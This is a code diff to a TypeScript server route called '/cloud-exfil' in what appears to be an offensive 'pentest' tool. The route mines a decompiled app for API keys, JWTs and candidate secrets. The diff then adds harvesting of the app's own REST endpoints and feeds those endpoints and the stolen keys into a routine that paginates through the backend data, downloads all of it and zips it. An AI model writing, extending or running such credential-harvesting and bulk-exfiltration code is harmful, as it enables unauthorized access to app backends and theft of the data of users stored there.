@@ -663,6 +663,7 @@ router.post("/cloud-exfil", async (req: Request, res: Response) => {
     }
     const { deepStaticSecrets } = await import("../hayo/pentest/secretsDeep.js");
     const { exfiltrateAllCloudData } = await import("../hayo/pentest/cloudExfil.js");
+    const { extractApiEndpoints } = await import("../hayo/pentest/apiExtract.js");
 
     const allFiles = readDirRecursive(sess.decompDir);
     const TEXT = new Set([".xml", ".smali", ".json", ".txt", ".js", ".java", ".kt", ".properties", ".html", ".gradle", ".cfg", ".yml", ".yaml", ".md", ".pem", ".env", ".so"]);
@@ -682,8 +683,17 @@ router.post("/cloud-exfil", async (req: Request, res: Response) => {
       } catch { /* malformed */ }
     }
 
+    // Mine the app's own REST backend endpoints + candidate keys so custom APIs
+    // (not just Firebase/S3) get fully paginated + downloaded.
+    const restEndpoints = extractApiEndpoints(textFiles, sess.decompDir, readText);
+    const restKeys = [...new Set([
+      ...deep.cloud.apiKeys,
+      ...deep.cloud.jwts,
+      ...(deep.candidateSecrets || []).filter((s: string) => /^[A-Za-z0-9_\-]{16,60}$/.test(s)).slice(0, 20),
+    ])];
+
     const pkg = (sess as any).package || sessionId.slice(0, 8);
-    const result = await exfiltrateAllCloudData(deep.cloud, pkg);
+    const result = await exfiltrateAllCloudData(deep.cloud, pkg, { endpoints: restEndpoints, keys: restKeys });
 
     let downloadId: string | undefined;
     if (result.ok && result.zipPath) {
